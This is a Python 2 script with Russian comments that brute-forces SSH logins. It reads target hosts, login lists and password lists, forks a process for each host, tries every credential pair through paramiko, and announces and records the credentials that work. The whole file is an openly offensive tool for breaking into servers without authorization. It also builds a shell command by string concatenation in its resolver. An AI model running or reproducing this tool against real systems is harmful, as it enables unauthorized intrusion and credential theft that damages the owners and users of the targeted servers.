#! /usr/bin/python
# -*- coding: utf-8 -*-

from paramiko import *	# Избавляемся от префикса paramiko
import commands 		# Либа для выполнения системной команды host в функции резолва доменов 
import socket			# Избавляемся от ошибки в эксепшне обрыва соединения
import os				# Необходимо для работы с форками
import sys 				# Используется для красивого вывода

# Открываем файлы
targets = 	open('./targets.lst').readlines() # Большие файлы при таком использовании будут сжирать много памяти
logins 	= 	open('./logins.lst').readlines()
passwords =	open('./passwords.lst').readlines()
results	=	open('./results.lst', 'w')	# Кроме того нужно сохранять все хосты к которые не удалось просканировать
util.log_to_file('paramiko.log')	# Включаем логгирование в файл
# Инициализируем SSH-клиент
client = SSHClient()			# Создаём объект
client.load_system_host_keys()		# Подгружаем ключи хостов, а если ключа не нашлось =>
client.set_missing_host_key_policy(AutoAddPolicy()) # => добавляем автоматически

error='' 				# Глобальная переменная для остановки перебора, если хост недоступен

def resolv(host_n): 	# Доменный резолвер
	'''Возвращает IP из полученной строки. Если строка содержит доменное имя,
	resolv() возвращает IP, если же получен IP, то resolv() отдаёт именно его'''
	cmd_s = "host " + host_n		# Составляем команду host
	res = commands.getoutput(cmd_s).split()[3]
	if res == 'found:':
		return host_n
	else:
		return res

def child(target):	# Дочерний процесс	
	global error
	res = ['']
	#print 'Child:', os.getpid() , #''.strip()	# Выводим 
	for lgn in logins:
		lgn = lgn.strip() 
		if error == 'yes':
			error=''
			break
		for psw in passwords:
			psw = psw.strip()
			try:
				client.connect(target, username = lgn, password = psw, timeout=2)
				print "try 2"
				stdin, stdout, stderr = client.exec_command('date')
				print "try 3"
				#print 'DEBUG:', stdout
				print '!!! It\'s hacked', target, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
				print lgn, psw, '\n'
				res = target, lgn, psw
				print type(res)
				results.write(res)
				
			except SSHException:
				print 'Child:', '\t\t', os.getpid(), '\nTarget:', '\t', target, '\nWrong auth:', '\t', lgn, psw, '\n'
			except socket.error:
				print "\nConnection refused to host", target, '\nGoing to next host\n\n'
				error='yes'
				break # skip host if it refused
	print '\n\nExit and save\n\n'
	#results.write(res)
	results.close()
	os._exit(0)

def parent():
	for trg in targets:
		trg = resolv(trg.strip())
		newpid = os.fork()
		if newpid == 0:
			child(trg)
		#else:
		#	print newpid, 'else'
	#os._exit(0)

### MAIN ###
parent()
